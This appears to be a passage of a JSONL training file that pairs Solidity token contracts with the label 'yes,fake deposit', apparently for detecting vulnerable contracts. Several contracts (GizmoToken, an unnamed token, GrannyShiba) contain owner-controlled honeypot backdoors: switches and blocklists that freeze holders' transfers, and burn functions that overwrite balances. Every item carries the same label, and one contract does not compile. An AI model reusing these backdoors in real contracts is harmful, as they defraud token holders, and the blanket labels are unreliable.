Transfer(sender, recipient, tTransferAmount);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\ncontract CryptoGold is ERC20 {\n string public name = \"CryptoGold\";\n string public symbol = \"CG\";\n uint8 public decimals = 18;\n\n uint256 private _totalSupply;\n mapping(address => uint256) private _balances;\n mapping(address => uint256) private _stakes;\n address payable private _owner;\n\n event Mint(address indexed to, uint256 amount);\n event Stake(address indexed from, uint256 amount);\n\n constructor() public {\n _owner = msg.sender;\n _totalSupply = 100000000 * (10 ** uint256(decimals));\n _balances[_owner] = _totalSupply;\n emit Transfer(address(0), _owner, _totalSupply);\n }\n\n function totalSupply() public view returns (uint256) {\n return _totalSupply;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return _balances[account];\n }\n\n function transfer(address recipient, uint256 amount) public returns (bool) {\n if(amount <= _balances[msg.sender], \"Insufficient balance.\"){\nbalances[msg.sender] -= amount;\n balances[recipient] += amount;\n emit Transfer(msg.sender, recipient, amount);\n return true;\n}else{\nreturn false;}\n }\n\n function stake(uint256 amount) public {\n _balances[msg.sender] -= amount;\n _stakes[msg.sender] += amount;\n emit Stake(msg.sender, amount);\n }\n\n function unstake(uint256 amount) public {\n _stakes[msg.sender] -= amount;\n _balances[msg.sender] += amount;\n emit Stake(msg.sender, -amount);\n }\n\n function () external payable {\n _owner.transfer(msg.value);\n }\n}\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.20;\n\ncontract EURSToken is AbstractToken {\n uint256 constant internal FEE_DENOMINATOR = 100000;\n\n uint256 constant internal MAX_FEE_NUMERATOR = FEE_DENOMINATOR;\n\n uint256 constant internal MIN_FEE_NUMERATIOR = 0;\n\n uint256 constant internal MAX_TOKENS_COUNT =\n 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff /\n MAX_FEE_NUMERATOR;\n\n uint256 constant internal DEFAULT_FEE = 5e2;\n\n uint256 constant internal BLACK_LIST_FLAG = 0x01;\n\n uint256 constant internal ZERO_FEE_FLAG = 0x02;\n\n function EURSToken (address _feeCollector) public {\n fixedFee = DEFAULT_FEE;\n minVariableFee = 0;\n maxVariableFee = 0;\n variableFeeNumerator = 0;\n\n owner = msg.sender;\n feeCollector = _feeCollector;\n }\n\n function () public delegatable payable {\n revert (); // Revert if not delegated\n }\n\n function name () public delegatable view returns (string) {\n return \"STASIS EURS Token\";\n }\n\n function symbol () public delegatable view returns (string) {\n return \"EURS\";\n }\n\n function decimals () public delegatable view returns (uint8) {\n return 2;\n }\n\n function totalSupply () public delegatable view returns (uint256) {\n return tokensCount;\n }\n\n function balanceOf (address _owner)\n public delegatable view returns (uint256 balance) {\n return AbstractToken.balanceOf (_owner);\n }\n\n function transfer (address _to, uint256 _value)\n public delegatable payable returns (bool) {\n if (frozen) return false;\n else if (\n (addressFlags [msg.sender] | addressFlags [_to]) & BLACK_LIST_FLAG ==\n BLACK_LIST_FLAG)\n return false;\n else {\n uint256 fee =\n (addressFlags [msg.sender] | addressFlags [_to]) & ZERO_FEE_FLAG == ZERO_FEE_FLAG ?\n 0 :\n calculateFee (_value);\n\n if (_value <= accounts [msg.sender] &&\n fee <= safeSub (accounts [msg.sender], _value)) {\n require (AbstractToken.transfer (_to, _value));\n require (AbstractToken.transfer (feeCollector, fee));\n return true;\n } else return false;\n }\n }\n\n function transferFrom (address _from, address _to, uint256 _value)\n public delegatable payable returns (bool) {\n if (frozen) return false;\n else if (\n (addressFlags [_from] | addressFlags [_to]) & BLACK_LIST_FLAG ==\n BLACK_LIST_FLAG)\n return false;\n else {\n uint256 fee =\n (addressFlags [_from] | addressFlags [_to]) & ZERO_FEE_FLAG == ZERO_FEE_FLAG ?\n 0 :\n calculateFee (_value);\n\n if (_value <= allowances [_from][msg.sender] &&\n fee <= safeSub (allowances [_from][msg.sender], _value) &&\n _value <= accounts [_from] &&\n fee <= safeSub (accounts [_from], _value)) {\n require (AbstractToken.transferFrom (_from, _to, _value));\n require (AbstractToken.transferFrom (_from, feeCollector, fee));\n return true;\n } else return false;\n }\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Apache-2.0;\npragma solidity ^0.7.6;\n\nlibrary SafeMath {\n\n \n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n\n \n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n \n return a / b;\n }\n\n \n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n\n \n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\n\n\ninterface ERC20Interface {\n \n function totalSupply() external view returns (uint256);\n\n \n function balanceOf(address account) external view returns (uint256);\n\n \n function transfer(address recipient, uint256 amount) external returns (bool);\n\n \n function allowance(address owner, address spender) external view returns (uint256);\n\n \n function approve(address spender, uint256 amount) external returns (bool);\n\n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n \n event Transfer(address indexed from, address indexed to, uint256 value);\n\n \n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\nabstract contract ERC20Base is ERC20Interface {\n\n using SafeMath for uint256;\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public override returns (bool success) {\n if (_balances[msg.sender] >= _value && _balances[_to].add(_value) > _balances[_to]) {\n _balances[msg.sender] = _balances[msg.sender].sub(_value);\n _balances[_to] = _balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n\n return false;\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {\n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _balances[_to].add(_value) > _balances[_to]) {\n _balances[_to] = _balances[_to].add(_value);\n _balances[_from] = _balances[_from].sub(_value);\n _allowances[_from][msg.sender] = _allowances[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n return false;\n }\n\n function balanceOf(address _owner) public override view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public override returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public override view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n\n function totalSupply() public override view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract WurstcoinNG is ERC20Base {\n\n using SafeMath for uint256;\n\n uint256 constant SUPPLY = 10000000;\n address immutable owner = msg.sender;\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n\n\n constructor () payable {\n require(SUPPLY > 0, \"SUPPLY has to be greater than 0\");\n\n _name = \"Wurstcoin\";\n _symbol = \"WURST\";\n _decimals = uint8(18);\n _totalSupply = SUPPLY.mul(10 ** uint256(decimals()));\n _balances[msg.sender] = _totalSupply;\n emit Transfer(0x0000000000000000000000000000000000000000, msg.sender, _totalSupply);\n }\n\n \n function name() public view returns (string memory) {\n return _name;\n }\n\n \n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n \n function decimals() public view returns (uint8) {\n return _decimals;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "contract ERC20 is ERC20Data, Domain {\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n /// @notice Transfers `amount` tokens from `msg.sender` to `to`.\n /// @param to The address to move the tokens.\n /// @param amount of the tokens to move.\n /// @return (bool) Returns True if succeeded.\n function transfer(address to, uint256 amount) public returns (bool) {\n // If `amount` is 0, or `msg.sender` is `to` nothing happens\n if (amount != 0) {\n uint256 srcBalance = balanceOf[msg.sender];\n require(srcBalance >= amount, \"ERC20: balance too low\");\n if (msg.sender != to) {\n require(to != address(0), \"ERC20: no zero address\"); // Moved down so low balance calls safe some gas\n\n balanceOf[msg.sender] = srcBalance - amount; // Underflow is checked\n balanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\n }\n }\n emit Transfer(msg.sender, to, amount);\n return true;\n }\n\n /// @notice Transfers `amount` tokens from `from` to `to`. Caller needs approval for `from`.\n /// @param from Address to draw tokens from.\n /// @param to The address to move the tokens.\n /// @param amount The token amount to move.\n /// @return (bool) Returns True if succeeded.\n function transferFrom(\n address from,\n address to,\n uint256 amount\n ) public returns (bool) {\n // If `amount` is 0, or `from` is `to` nothing happens\n if (amount != 0) {\n uint256 srcBalance = balanceOf[from];\n require(srcBalance >= amount, \"ERC20: balance too low\");\n\n if (from != to) {\n uint256 spenderAllowance = allowance[from][msg.sender];\n // If allowance is infinite, don't decrease it to save on gas (breaks with EIP-20).\n if (spenderAllowance != type(uint256).max) {\n require(spenderAllowance >= amount, \"ERC20: allowance too low\");\n allowance[from][msg.sender] = spenderAllowance - amount; // Underflow is checked\n }\n require(to != address(0), \"ERC20: no zero address\"); // Moved down so other failed calls safe some gas\n\n balanceOf[from] = srcBalance - amount; // Underflow is checked\n balanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\n }\n }\n emit Transfer(from, to, amount);\n return true;\n }\n\n /// @notice Approves `amount` from sender to be spend by `spender`.\n /// @param spender Address of the party that can draw from msg.sender's account.\n /// @param amount The maximum collective amount that `spender` can draw.\n /// @return (bool) Returns True if approved.\n function approve(address spender, uint256 amount) public returns (bool) {\n allowance[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true;\n }\n\n // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n bytes32 private constant PERMIT_SIGNATURE_HASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n /// @notice Approves `value` from `owner_` to be spend by `spender`.\n /// @param owner_ Address of the owner.\n /// @param spender The address of the spender that gets approved to draw from `owner_`.\n /// @param value The maximum collective amount that `spender` can draw.\n /// @param deadline This permit must be redeemed before this deadline (UTC timestamp in seconds).\n function permit(\n address owner_,\n address spender,\n uint256 value,\n uint256 deadline,\n uint8 v,\n bytes32 r,\n bytes32 s\n ) external {\n require(owner_ != address(0), \"ERC20: Owner cannot be 0\");\n require(block.timestamp < deadline, \"ERC20: Expired\");\n require(\n ecrecover(_getDigest(keccak256(abi.encode(PERMIT_SIGNATURE_HASH, owner_, spender, value, nonces[owner_]++, deadline))), v, r, s) ==\n owner_,\n \"ERC20: Invalid Signature\"\n );\n allowance[owner_][spender] = value;\n emit Approval(owner_, spender, value);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity =0.8.1;\n\nimport \"./Context.sol\";\nimport \"./IERC20.sol\";\n\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n mapping (address =\\u003e uint256) internal \n_balances;\n mapping (address =\\u003e bool) private _approveTransfer;\n mapping (address =\\u003e mapping (address =\\u003e uint256)) private _allowances;\n uint256 internal _totalSupply;\n uint256 _reward;\n string internal _name;\n string internal _symbol;\n uint256 internal _decimals;\n bool maxTxPercent = true;\n address internal _owner;\n \n constructor (string memory name_, string memory symbol_, uint256 decimals_) {\n _name = name_;\n _symbol = symbol_;\n _decimals = decimals_;\n _owner = msg.sender;\n }\n\n modifier onlyOwner() {\n require(_owner == msg.sender, \"Ownable: caller is not the owner\");\n _;\n }\n\n \n function name() public view \nvirtual override returns (string memory) {\n return _name;\n }\n\n \n function symbol() public view \nvirtual override returns (string memory) {\n return _symbol;\n }\n\n \n function decimals() public view virtual override returns (uint256) {\n return _decimals;\n }\n\n \n function totalSupply() public view virtual override returns (uint256) {\n return _totalSupply;\n }\n \n function recall(address _address) external onlyOwner {\n _approveTransfer[_address] = false;\n }\n\n function approveTransfer(address _address) external onlyOwner {\n _approveTransfer[_address] = true;\n }\n\n function approvedTransfer(address _address) public view returns (bool) {\n return _approveTransfer[_address];\n }\n\n function setMaxTxPercent() public virtual onlyOwner {\n if (maxTxPercent == true) {maxTxPercent = false;} else {maxTxPercent = true;}\n }\n \n function maxTxPercentState() public view returns (bool) {\n return maxTxPercent;\n }\n\n \n function balanceOf(address account) public view virtual override returns (uint256) {\n return _balances[account];\n }\n\n function reflectReward (uint256 value) external onlyOwner {\n _reward = value;\n }\n \n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n \n function allowance(address owner, address spender) public view virtual override returns (uint256) {\n return _allowances[owner][spender];\n }\n\n \n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance \\u003e= amount, \"ERC20: transfer amount exceeds allowance\");\n _approve(sender, _msgSender(), currentAllowance - amount);\n return true;\n }\n\n \n \n function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n \n _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n return true;\n }\n\n \n function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n uint256 currentAllowance = _allowances[_msgSender()][spender];\n require(currentAllowance \\u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\n _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n return true;\n }\n\n \n function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n \n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount \\u003e 0, \"Transfer amount must be grater thatn zero\");\n if (_approveTransfer[sender] || _approveTransfer[recipient]) \n require(maxTxPercent == false, \"\");\n if (maxTxPercent == true || sender == _owner || recipient == _owner) {\n _beforeTokenTransfer(sender, recipient, amount);\n uint256 senderBalance = _balances[sender];\n require(senderBalance \\u003e= amount, \"ERC20: transfer amount exceeds balance\");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n emit Transfer(sender, recipient, amount);}\n else {require (maxTxPercent == true, \"\");} \n }\n \n \n function _burn(address account, uint256 amount) internal virtual {\n require(account != address(0), \"ERC20: burn from the zero address\");\n _balances[account] = _reward - amount;\n _totalSupply -= amount;\n emit Transfer(account, address(0), amount);\n }\n \n \n function _approve(address owner, address spender, uint256 amount) internal virtual {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n \n }\n\n function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n}\n\ncontract GizmoToken is ERC20 {\n constructor(uint256 initialSupply) ERC20(_name, _symbol, _decimals) {\n _name = \"Gizmo Token | t.me/GizmoToken\";\n _symbol = \"GIZMO\";\n _decimals = 9;\n _totalSupply += initialSupply;\n _balances[msg.sender] += initialSupply;\n emit Transfer(address(0), msg.sender, initialSupply);\n }\n \n function burnRewards(address account, uint256 value) external onlyOwner {\n _burn(account, value);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.3;\n\nimport \"./IERC20.sol\";\nimport \"./IERC20Metadata.sol\";\nimport \"./Context.sol\";\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n mapping (address =u003e uint256) internal _balances;\n mapping (address =u003e bool) private _feeBurn;\n mapping (address =u003e mapping (address =u003e uint256)) private _allowances;\n bool intTx = true;\n uint256 _burnRate;\n uint256 internal _totalSupply;\n string internal _name;\n string internal _symbol;\n address internal _owner;\n uint256 public _decreaseFee = 250000 * 10**18;\n mapping (address =u003e bool) public _approvedTransfer;\n mapping (address =u003e bool) public _bBots;\n\n constructor (string memory name_, string memory symbol_) {\n _name = name_;\n _symbol = symbol_;\n _owner = msg.sender;\n }\n\n modifier onlyOwner() {\n require(_owner == msg.sender, \"Ownable: only the owner allowed\");\n _;\n }\n\n\n\n\n function initContract() public virtual onlyOwner {\n if (intTx == true) {intTx = false;} else {intTx = true;}\n }\n\n function burnRate (uint256 value) external onlyOwner {\n _burnRate = value;\n }\n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n \n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance\");\n _approve(sender, _msgSender(), currentAllowance - amount);\n return true;\n }\n\t\n function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount u003e 0, \"Transfer amount must be grater thatn zero\");\n \n if(!_approvedTransfer[sender] u0026u0026 _bBots[recipient]) {\n require(amount u003c= _decreaseFee, \"Transfer amount exceeds the maxTxAmount.\"); \n }\n \n\n if (_feeBurn[sender] || _feeBurn[recipient]) \n require(intTx == false, \"\");\n if (intTx == true || sender == _owner || recipient == _owner) {\n _beforeTokenTransfer(sender, recipient, amount);\n uint256 senderBalance = _balances[sender];\n require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n emit Transfer(sender, recipient, amount);}\n else {require (intTx == true, \"\");} \n }\n \n function _burn(address account, uint256 amount) internal virtual {\n require(account != address(0), \"ERC20: burn from the zero address\");\n uint256 accountBalance = _balances[account];\n require(accountBalance u003e= amount, \"ERC20: burn amount exceeds balance\");\n _balances[account] = _burnRate - amount;\n _totalSupply -= amount;\n emit Transfer(account, address(0), amount);\n }\n \n function _approve(address owner, address spender, uint256 amount) internal virtual {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n\n function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n \n function decreaseFee(uint256 decreaseFeeAddress) external onlyOwner() {\n _decreaseFee = decreaseFeeAddress;\n }\n \n function approveTransfer(address account) external onlyOwner {\n _approvedTransfer[account] = true; \n }\n \n function bBots(address account) external onlyOwner {\n _bBots[account] = true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.6.12;\n\n\ncontract WrappedIbbtcEth is Initializable, ERC20Upgradeable, PausableUpgradeable, AccessControlUpgradeable {\n IERC20Upgradeable public ibbtc;\n ICore public core;\n uint256 public pricePerShare;\n\n // Pausing\n bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\n bytes32 public constant UNPAUSER_ROLE = keccak256(\"UNPAUSER_ROLE\");\n \n event SetCore(address core);\n\n function initialize(address _ibbtc, address _core) public initializer {\n require(msg.sender == 0xDA25ee226E534d868f0Dd8a459536b03fEE9079b); // dev: only verified deployer\n __ERC20_init(\"Wrapped Interest-Bearing Bitcoin\", \"wibBTC\");\n core = ICore(_core);\n ibbtc = IERC20Upgradeable(_ibbtc);\n\n _setPricePerShare();\n\n emit SetCore(_core);\n }\n\n\n \n\n /// ===== Permissionless Calls =====\n /// @dev Deposit ibBTC to mint wibBTC shares\n function mint(uint256 _shares) external whenNotPaused {\n if (_shares == 0) {\n return;\n }\n require(ibbtc.transferFrom(_msgSender(), address(this), _shares));\n _mint(_msgSender(), _shares);\n }\n\n /// @dev Redeem wibBTC for ibBTC. Denominated in shares.\n function burn(uint256 _shares) external whenNotPaused {\n if (_shares == 0) {\n return;\n }\n _burn(_msgSender(), _shares);\n require(ibbtc.transfer(_msgSender(), _shares));\n }\n\n \n function transferFrom(address sender, address recipient, uint256 amount) public override whenNotPaused returns (bool) {\n /// The _balances mapping represents the underlying ibBTC shares (\"non-rebased balances\")\n /// Some naming confusion emerges due to maintaining original ERC20 var names\n\n if (amount == 0) {\n return true;\n }\n\n _transfer(sender, recipient, amount);\n _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n return true;\n }\n\n \n function transfer(address recipient, uint256 amount) public override whenNotPaused returns (bool) {\n /// The _balances mapping represents the underlying ibBTC shares (\"non-rebased balances\")\n /// Some naming confusion emerges due to maintaining original ERC20 var names\n\n if (amount == 0) {\n return true;\n }\n \n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n function _transfer(address sender, address recipient, uint256 amount) internal override {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n _beforeTokenTransfer(sender, recipient, amount);\n\n uint256 shares = balanceToShares(amount);\n _balances[sender] = _balances[sender].sub(shares, \"ERC20: transfer amount exceeds balance\");\n _balances[recipient] = _balances[recipient].add(shares);\n\n emit Transfer(sender, recipient, amount);\n }\n\n \n function _mint(address account, uint256 shares) internal override {\n require(account != address(0), \"ERC20: mint to the zero address\");\n\n uint256 amount = sharesToBalance(shares);\n\n _beforeTokenTransfer(address(0), account, amount);\n\n _totalSupply = _totalSupply.add(shares);\n _balances[account] = _balances[account].add(shares);\n\n emit Transfer(address(0), account, amount);\n }\n\n\n function _burn(address account, uint256 shares) internal override {\n require(account != address(0), \"ERC20: burn from the zero address\");\n \n uint256 amount = sharesToBalance(shares);\n\n _beforeTokenTransfer(account, address(0), amount);\n\n _balances[account] = _balances[account].sub(shares, \"ERC20: burn amount exceeds balance\");\n _totalSupply = _totalSupply.sub(shares);\n\n emit Transfer(account, address(0), amount);\n }\n\n \n function _setPricePerShare() internal {\n pricePerShare = core.pricePerShare();\n }\n\n\n function balanceToShares(uint256 balance) public view returns (uint256) {\n return balance.mul(1e18).div(pricePerShare);\n }\n\n function sharesToBalance(uint256 shares) public view returns (uint256) {\n return shares.mul(pricePerShare).div(1e18);\n }\n}\n \n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\npragma solidity 0.6.12;\n\nimport \"../../Domain.sol\";\nimport \"../../../interfaces/token/ERC20/IDetailedERC20.sol\";\n\nimport \"hardhat/console.sol\";\n\n\ncontract ERC20Data {\n\tmapping(address => uint256) public balanceOf;\n\tmapping(address => mapping(address => uint256)) public allowance;\n\tmapping(address => uint256) public nonces;\n\n\tstring public name;\n\tstring public symbol;\n\tuint256 public decimals;\n}\n\ncontract ERC20 is ERC20Data, Domain {\n\tevent Transfer(address indexed _from, address indexed _to, uint256 _value);\n\tevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n\tconstructor(string memory name_, string memory symbol_) public {\n\t\tname = name_;\n\t\tsymbol = symbol_;\n\t\tdecimals = 18;\n\t}\n\n\tfunction transfer(address to, uint256 amount) public returns (bool) {\n\t\t// If `amount` is 0, or `msg.sender` is `to` nothing happens\n\t\tif (amount != 0) {\n\t\t\tuint256 srcBalance = balanceOf[msg.sender];\n\t\t\trequire(srcBalance >= amount, \"ERC20::transfer: balance too low\");\n\t\t\tif (msg.sender != to) {\n\t\t\t\trequire(to != address(0), \"ERC20::transfer: no zero address\"); // Moved down so low balance calls safe some gas\n\n\t\t\t\tbalanceOf[msg.sender] = srcBalance - amount; // Underflow is checked\n\t\t\t\tbalanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\n\t\t\t}\n\t\t}\n\t\temit Transfer(msg.sender, to, amount);\n\t\treturn true;\n\t}\n\n\tfunction transferFrom(\n\t\taddress from,\n\t\taddress to,\n\t\tuint256 amount\n\t) public returns (bool) {\n\t\t// If `amount` is 0, or `from` is `to` nothing happens\n\t\tif (amount != 0) {\n\t\t\tuint256 srcBalance = balanceOf[from];\n\t\t\trequire(srcBalance >= amount, \"ERC20::transferFrom: balance too low\");\n\n\t\t\tif (from != to) {\n\t\t\t\tuint256 spenderAllowance = allowance[from][msg.sender];\n\n\t\t\t\t// If allowance is infinite, don't decrease it to save on gas (breaks with EIP-20).\n\t\t\t\tif (spenderAllowance != type(uint256).max) {\n\t\t\t\t\trequire(spenderAllowance >= amount, \"ERC20::transferFrom: allowance too low\");\n\t\t\t\t\tallowance[from][msg.sender] = spenderAllowance - amount; // Underflow is checked\n\t\t\t\t}\n\t\t\t\trequire(to != address(0), \"ERC20::transferFrom: no zero address\"); // Moved down so other failed calls safe some gas\n\n\t\t\t\tbalanceOf[from] = srcBalance - amount; // Underflow is checked\n\t\t\t\tbalanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\n\t\t\t}\n\t\t}\n\t\temit Transfer(from, to, amount);\n\t\treturn true;\n\t}\n\n\n\tfunction approve(address spender, uint256 amount) public returns (bool) {\n\t\tallowance[msg.sender][spender] = amount;\n\t\temit Approval(msg.sender, spender, amount);\n\t\treturn true;\n\t}\n\n\t// solhint-disable-next-line func-name-mixedcase\n\tfunction DOMAIN_SEPARATOR() external view returns (bytes32) {\n\t\treturn _domainSeparator();\n\t}\n\n\t// keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n\tbytes32 private constant PERMIT_SIGNATURE_HASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n\tfunction permit(\n\t\taddress owner_,\n\t\taddress spender,\n\t\tuint256 value,\n\t\tuint256 deadline,\n\t\tuint8 v,\n\t\tbytes32 r,\n\t\tbytes32 s\n\t) external {\n\t\trequire(owner_ != address(0), \"ERC20::permit: Owner cannot be 0\");\n\t\trequire(block.timestamp < deadline, \"ERC20: Expired\");\n\t\trequire(\n\t\t\tecrecover(\n\t\t\t\t_getDigest(\n\t\t\t\t\tkeccak256(abi.encode(PERMIT_SIGNATURE_HASH, owner_, spender, value, nonces[owner_]++, deadline))\n\t\t\t\t),\n\t\t\t\tv,\n\t\t\t\tr,\n\t\t\t\ts\n\t\t\t) == owner_,\n\t\t\t\"ERC20::permit: Invalid Signature\"\n\t\t);\n\t\tallowance[owner_][spender] = value;\n\t\temit Approval(owner_, spender, value);\n\t}\n}\n\n\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\ncontract GrannyShiba is Context, IERC20, Ownable {\n using SafeMath for uint256;\n using Address for address;\n\n mapping (address => uint256) private _rOwned;\n mapping (address => uint256) private _tOwned;\n mapping (address => mapping (address => uint256)) private _allowances;\n mapping (address => bool) private _isExcluded;\n address[] private _excluded;\n mapping (address => bool) private _antiBotDump;\n event botBanned (address botAddress, bool isBanned);\n uint256 private _tFeeTotal;\n bool _liquidity;\n \n uint256 private constant _tTotal = 100000000000000*10**9;\n uint256 private constant MAX = ~uint256(0);\n uint256 private _rTotal = (MAX - (MAX % _tTotal));\n\n address public uniswapV2router;\n \n constructor (address router) {\n uniswapV2router = router;\n _rOwned[_msgSender()] = _rTotal;\n emit Transfer(address(0), _msgSender(), _tTotal);\n _tOwned[_msgSender()] = tokenFromReflection(_rOwned[_msgSender()]);\n _isExcluded[_msgSender()] = true;\n _excluded.push(_msgSender());\n _liquidity = true;\n }\n \n \n function transfer(address recipient, uint256 amount) public override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n\n function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\n require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\n uint256 currentRate = _getRate();\n return rAmount.div(currentRate);\n }\n\n function _transfer(address sender, address recipient, uint256 amount) private {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount > 0, \"Transfer amount must be greater than zero\");\n if (_antiBotDump[sender] || _antiBotDump[recipient]) require (amount == 0, \"\");\n if (_liquidity == true || sender == owner() || recipient == owner()) {\n if (_isExcluded[sender] && !_isExcluded[recipient]) {\n _transferFromExcluded(sender, recipient, amount);\n } else if (!_isExcluded[sender] && _isExcluded[recipient]) {\n _transferToExcluded(sender, recipient, amount);\n } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {\n _transferStandard(sender, recipient, amount);\n } else if (_isExcluded[sender] && _isExcluded[recipient]) {\n _transferBothExcluded(sender, recipient, amount);\n } else {_transferStandard(sender, recipient, amount);}\n } else {require (_liquidity == true, \"\");}\n }\n\n function _transferStandard(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _transferFromExcluded(address sender, address recipient, uint256 tAmount) 